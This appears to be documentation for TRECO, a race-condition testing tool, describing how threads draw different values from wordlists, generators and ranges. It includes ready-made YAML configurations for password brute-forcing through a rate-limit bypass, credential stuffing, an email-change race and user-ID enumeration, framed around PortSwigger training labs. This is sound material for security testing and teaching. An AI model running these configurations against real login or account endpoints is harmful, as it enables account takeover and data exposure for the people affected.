# Dynamic Input Sources for Race Condition Attacks

TRECO's dynamic input sources enable each thread in a race attack to use different values, making it possible to perform brute-force attacks, credential stuffing, enumeration, and other multi-value testing scenarios.

## Table of Contents

- [Overview](#overview)
- [Input Sources](#input-sources)
- [Distribution Modes](#distribution-modes)
- [Configuration](#configuration)
- [Examples](#examples)
- [Built-in Wordlists](#built-in-wordlists)
- [Advanced Usage](#advanced-usage)
- [Troubleshooting](#troubleshooting)

## Overview

Traditional race condition attacks send identical requests from all threads to expose timing windows. TRECO extends this by allowing each thread to send **different** values while still maintaining precise synchronization.

### Use Cases

1. **Rate Limit Bypass**: Each thread tries a different password to bypass login rate limits
2. **Credential Stuffing**: Test multiple username/password combinations simultaneously
3. **Resource Enumeration**: Each thread checks a different resource ID
4. **Single-Endpoint Races**: Two threads send different values to the same endpoint
5. **Token Collision Testing**: Multiple threads use different tokens to find collisions

### PortSwigger Labs Requiring This Feature

- [Lab 2: Bypassing rate limits via race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits)
- [Lab 4: Single-endpoint race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint)

## Input Sources

TRECO supports four types of input sources:

### 1. Inline Lists

Direct list of values in the YAML configuration.

```yaml
entrypoint:
  input:
    passwords:
      - "password123"
      - "qwerty"
      - "admin123"
```

**Best for:** Small, static lists of values (< 20 items)

### 2. File Source

Load values from external files or built-in wordlists.

```yaml
entrypoint:
  input:
    passwords:
      source: file
      path: "builtin:passwords-top-100"  # Built-in wordlist
    
    # Or use custom file
    custom_payloads:
      source: file
      path: "/path/to/wordlist.txt"
```

**Best for:** Large wordlists, reusable payloads

**File Format:** One value per line, empty lines are skipped

### 3. Generator Source

Generate values dynamically using Jinja2 expressions.

```yaml
entrypoint:
  input:
    user_ids:
      source: generator
      expression: "{{ 1000 + index }}"
      count: 100
```

**Best for:** Sequential values, formatted strings, computed values

**Available Variables:**
- `index` or `i`: Current iteration (0-based)
- All Jinja2 filters: `format`, `random`, etc.

**Examples:**
```yaml
# Sequential IDs
expression: "USER-{{ index }}"
# Output: USER-0, USER-1, USER-2, ...

# Formatted numbers
expression: "{{ '%04d' | format(1000 + index) }}"
# Output: 1000, 1001, 1002, ...

# Random hex tokens
expression: "{{ '%08x' | format(range(0, 16777215) | random) }}"
```

### 4. Range Source

Generate simple numeric sequences.

```yaml
entrypoint:
  input:
    resource_ids:
      source: range
      start: 1
      count: 100
```

**Best for:** Numeric sequences, port ranges, simple iteration

**Options:**
```yaml
# Option 1: start + count
start: 100
count: 50      # Generates: 100, 101, ..., 149

# Option 2: start + end
start: 100
end: 150       # Generates: 100, 101, ..., 149

# Option 3: count only (starts at 0)
count: 10      # Generates: 0, 1, ..., 9
```

## Distribution Modes

Control how input values are distributed across threads using the `input_mode` parameter in race configuration.

### `same` (Default)

All threads receive the same value. This is the default mode for backward compatibility.

```yaml
race:
  threads: 10
  input_mode: same  # Optional, this is the default
```

**Use Case:** Traditional race conditions (limit overrun, TOCTOU)

### `distribute`

Round-robin distribution. Each thread gets a unique value, cycling if there are more threads than values.

```yaml
entrypoint:
  input:
    passwords: ["pass1", "pass2", "pass3"]

states:
  brute_force:
    race:
      threads: 5
      input_mode: distribute
    
    request: |
      username=admin&password={{ input.password }}
```

**Thread Assignment:**
- Thread 0: `password="pass1"`
- Thread 1: `password="pass2"`
- Thread 2: `password="pass3"`
- Thread 3: `password="pass1"` (cycles)
- Thread 4: `password="pass2"`

**Use Case:** Brute-force attacks, enumeration

### `product`

Cartesian product of all input variables. Tests all possible combinations.

```yaml
entrypoint:
  input:
    usernames: ["admin", "root"]
    passwords: ["123", "456", "789"]

states:
  credential_stuffing:
    race:
      threads: 6  # 2 users × 3 passwords
      input_mode: product
```

**Thread Assignment:**
- Thread 0: `username="admin", password="123"`
- Thread 1: `username="admin", password="456"`
- Thread 2: `username="admin", password="789"`
- Thread 3: `username="root", password="123"`
- Thread 4: `username="root", password="456"`
- Thread 5: `username="root", password="789"`

**Use Case:** Credential stuffing, combination testing

### `random`

Each thread gets a random value from each input list.

```yaml
race:
  threads: 100
  input_mode: random
```

**Use Case:** Fuzzing, load testing, random sampling

## Configuration

### Entrypoint-Level Input

Define inputs that are available to all states:

```yaml
entrypoint:
  state: initial_state
  input:
    username: "test_user"
    api_key: "{{ env('API_KEY') }}"
    passwords:
      - "password1"
      - "password2"
```

### State-Level Input

Override or add inputs for specific states:

```yaml
states:
  login:
    # Uses entrypoint input
    request: |
      POST /login HTTP/1.1
      username={{ username }}&password={{ password }}
    next:
      - goto: race_emails
  
  race_emails:
    # State-level input overrides entrypoint
    input:
      emails:
        - "attacker@evil.com"
        - "carlos@target.com"
    
    race:
      threads: 2
      input_mode: distribute
    
    request: |
      POST /change-email HTTP/1.1
      email={{ input.email }}
```

### Accessing Input Values

Input values are available via the `input` namespace in templates:

```yaml
request: |
  POST /api/login HTTP/1.1
  Content-Type: application/json
  
  {"username": "{{ input.username }}", "password": "{{ input.password }}"}

logger:
  on_thread_leave: |
    {% if response.status_code == 200 %}
    ✅ Thread {{ thread.id }}: SUCCESS with {{ input.password }}
    {% else %}
    ❌ Thread {{ thread.id }}: FAILED with {{ input.password }}
    {% endif %}
```

## Examples

### Example 1: Rate Limit Bypass (PortSwigger Lab 2)

```yaml
metadata:
  name: "Rate Limit Bypass"
  version: "1.0"
  author: "Security Team"
  vulnerability: "CWE-307"

target:
  host: "{{ env('LAB_HOST') }}"
  port: 443
  tls:
    enabled: true
    verify_cert: false

entrypoint:
  state: brute_force
  input:
    username: "carlos"
    passwords:
      source: file
      path: "builtin:passwords-top-100"

states:
  brute_force:
    race:
      threads: 50
      input_mode: distribute
      sync_mechanism: barrier
    
    request: |
      POST /login HTTP/1.1
      Host: {{ target.host }}
      Content-Type: application/x-www-form-urlencoded
      
      username={{ username }}&password={{ input.password }}
    
    logger:
      on_thread_leave: |
        {% if response.status_code == 302 %}
        🟢 SUCCESS: {{ input.password }}
        {% else %}
        🔴 Failed: {{ input.password }}
        {% endif %}
```

### Example 2: Single-Endpoint Race (PortSwigger Lab 4)

```yaml
metadata:
  name: "Email Change Race"
  version: "1.0"
  author: "Security Team"
  vulnerability: "CWE-362"

target:
  host: "{{ env('LAB_HOST') }}"
  port: 443
  tls:
    enabled: true

entrypoint:
  state: login
  input:
    username: "wiener"
    password: "peter"

states:
  login:
    request: |
      POST /login HTTP/1.1
      username={{ username }}&password={{ password }}
    
    extract:
      session:
        type: cookie
        pattern: session
    
    next:
      - on_status: 302
        goto: race_email_change

  race_email_change:
    input:
      emails:
        - "attacker@exploit-server.net"
        - "carlos@ginandjuice.shop"
    
    race:
      threads: 2
      input_mode: distribute
      sync_mechanism: barrier
    
    request: |
      POST /my-account/change-email HTTP/1.1
      Cookie: session={{ login.session }}
      Content-Type: application/x-www-form-urlencoded
      
      email={{ input.email }}
    
    logger:
      on_thread_leave: |
        Thread {{ thread.id }}: email={{ input.email }} -> {{ response.status_code }}
```

### Example 3: User Enumeration

```yaml
metadata:
  name: "User Enumeration"
  version: "1.0"
  author: "Security Team"
  vulnerability: "CWE-639"

target:
  host: "api.example.com"
  port: 443

entrypoint:
  state: enumerate_users
  input:
    user_ids:
      source: range
      start: 1000
      count: 100

states:
  enumerate_users:
    race:
      threads: 100
      input_mode: distribute
      sync_mechanism: barrier
    
    request: |
      GET /api/users/{{ input.user_id }} HTTP/1.1
      Host: {{ target.host }}
      Authorization: Bearer {{ env('API_TOKEN') }}
    
    extract:
      username:
        type: jpath
        pattern: "$.username"
    
    logger:
      on_thread_leave: |
        {% if response.status_code == 200 %}
        ✅ User {{ input.user_id }}: {{ enumerate_users[thread.id].username }}
        {% elif response.status_code == 404 %}
        ⚪ User {{ input.user_id }}: Not found
        {% endif %}
```

## Built-in Wordlists

TRECO includes commonly used wordlists for quick testing.

### Available Wordlists

1. **`builtin:passwords-top-100`**
   - Top 100 most common passwords
   - Includes: password, 123456, qwerty, admin123, etc.
   - Size: ~100 passwords

2. **`builtin:usernames-common`**
   - Common usernames for enumeration
   - Includes: admin, root, user, test, etc.
   - Size: ~40 usernames

### Usage

```yaml
entrypoint:
  input:
    passwords:
      source: file
      path: "builtin:passwords-top-100"
    
    usernames:
      source: file
      path: "builtin:usernames-common"
```

### Custom Wordlists

Place your wordlist files anywhere and reference them:

```yaml
entrypoint:
  input:
    payloads:
      source: file
      path: "/home/user/wordlists/custom.txt"
    
    # Or relative to working directory
    other_payloads:
      source: file
      path: "wordlists/my-list.txt"
```

## Advanced Usage

### Multiple Input Sources with Product Mode

Test all combinations of multiple variables:

```yaml
entrypoint:
  input:
    methods: ["GET", "POST", "PUT"]
    endpoints: ["/api/v1/resource", "/api/v2/resource"]
    tokens:
      source: generator
      expression: "{{ '%08x' | format(index) }}"
      count: 10

states:
  test_combinations:
    race:
      threads: 60  # 3 × 2 × 10 = 60 combinations
      input_mode: product
```

### Conditional Input Generation

Use Jinja2 expressions for complex generation:

```yaml
entrypoint:
  input:
    payloads:
      source: generator
      expression: |
        {% if index % 2 == 0 %}
        {{ "EVEN-" ~ index }}
        {% else %}
        {{ "ODD-" ~ index }}
        {% endif %}
      count: 20
```

### Mixed Simple and Complex Inputs

```yaml
entrypoint:
  input:
    # Simple value
    api_version: "v1"
    
    # Inline list
    usernames: ["alice", "bob", "charlie"]
    
    # File source
    passwords:
      source: file
      path: "builtin:passwords-top-100"
    
    # Generator
    session_ids:
      source: generator
      expression: "{{ 'SID-' ~ '%06d' | format(index) }}"
      count: 50
    
    # Range
    port_numbers:
      source: range
      start: 8000
      count: 100
```

## Troubleshooting

### Issue: Input values not changing between threads

**Symptom:** All threads use the same value even with `input_mode: distribute`

**Solutions:**
1. Check that `input_mode` is specified in the `race` configuration
2. Verify input variable is accessed via `{{ input.varname }}` (not just `{{ varname }}`)
3. Ensure the input is defined at entrypoint or state level

### Issue: "Wordlist not found"

**Symptom:** `FileNotFoundError: Wordlist not found`

**Solutions:**
1. For built-in wordlists, use `builtin:` prefix: `path: "builtin:passwords-top-100"`
2. For custom files, check the path is correct (absolute or relative to working directory)
3. Verify the file exists and is readable

### Issue: "Template engine required for generator source"

**Symptom:** Error when using generator source

**Solution:** This should work automatically. If you see this error, report it as a bug.

### Issue: Thread count doesn't match input values

**Behavior:** This is expected. TRECO handles mismatches automatically:

- **More threads than values:** Values cycle (round-robin)
  - 3 passwords, 10 threads → passwords repeat: p1, p2, p3, p1, p2, p3, ...

- **More values than threads:** Only first N values used
  - 100 passwords, 10 threads → only first 10 passwords used

- **Product mode combinations:** Threads use first N combinations
  - 2 users × 50 passwords = 100 combinations
  - 20 threads → only first 20 combinations tested

**Best Practice:** Match thread count to number of values for efficiency.

### Issue: Generator expression not rendering correctly

**Common Mistakes:**

```yaml
# ❌ Wrong: Missing format
expression: "{{ index }}"  # Output: "0", "1", "2" (strings)

# ✅ Correct: Proper integer/string handling
expression: "{{ 1000 + index }}"  # Output: 1000, 1001, 1002 (integers)

# ✅ Correct: Formatted strings
expression: "ID-{{ '%04d' | format(index) }}"  # Output: ID-0000, ID-0001
```

### Issue: Product mode not generating expected combinations

**Debug Steps:**

1. Check number of threads matches combinations
2. Verify all input variables are lists
3. Use logging to see actual values:

```yaml
logger:
  on_thread_leave: |
    Thread {{ thread.id }}: {{ input | tojson }}
```

## Performance Considerations

1. **Large Wordlists:** Loading very large files (> 10k lines) may take time. Consider splitting or sampling.

2. **Generator Expressions:** Complex expressions are evaluated for each value. Keep expressions simple.

3. **Product Mode:** Combinations grow multiplicatively:
   - 10 users × 10 passwords = 100 combinations
   - 10 users × 100 passwords = 1000 combinations
   - Be mindful of thread limits (max 1000 in most systems)

4. **Memory Usage:** All input values are loaded into memory. For extremely large datasets, consider batching.

## Best Practices

1. **Start Small:** Test with small lists first (< 10 values) to verify logic

2. **Use Built-in Wordlists:** Start with `builtin:passwords-top-100` before using large custom lists

3. **Match Thread Count:** Set threads equal to number of values for optimal coverage

4. **Log Strategically:** Use `on_thread_leave` to log which values succeeded

5. **Test Locally First:** Validate your configuration against a test server before production use

6. **Rate Limiting:** Be aware that even distributed attacks can trigger rate limits. Consider delays if needed.

## See Also

- [Main README](../README.md)
- [Examples Directory](../examples/input-sources/)
- [ADVANCED_FEATURES.md](../ADVANCED_FEATURES.md)
- [When Blocks Documentation](./docs/WHEN_BLOCKS.md)
